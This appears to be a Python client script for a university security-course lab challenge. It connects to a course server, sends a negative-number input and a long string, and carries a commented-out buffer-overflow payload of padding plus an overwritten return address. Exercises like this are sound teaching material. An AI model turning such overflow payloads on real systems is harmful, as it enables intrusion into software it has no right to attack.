import socket

HOST = "cs177.seclab.cs.ucsb.edu"
PORT = 31126 
addr = (HOST, PORT)
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.connect(addr)
while True:
	c.settimeout(0.5)
	try:
		data = c.recv(1024)
		print(data.decode('utf-8'))
	except socket.timeout:
		break


print("first command")
c.sendall(("-1").encode('utf-8'))


while True:
	c.settimeout(0.5)
	try:
		data = c.recv(1024)
		print(data.decode('utf-8'))
	except socket.timeout:
		break
# c.sendall(("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"+"\x56\x85\x04\x08"+"ccccccccccccccccccccccccccccccc").encode('utf8'))
c.sendall(("1"*79).encode('utf-8'))
while True:
	c.settimeout(0.5)
	try:
		data = c.recv(1024)
		print(data.decode('utf-8'))
	except socket.timeout:
		break

print("end")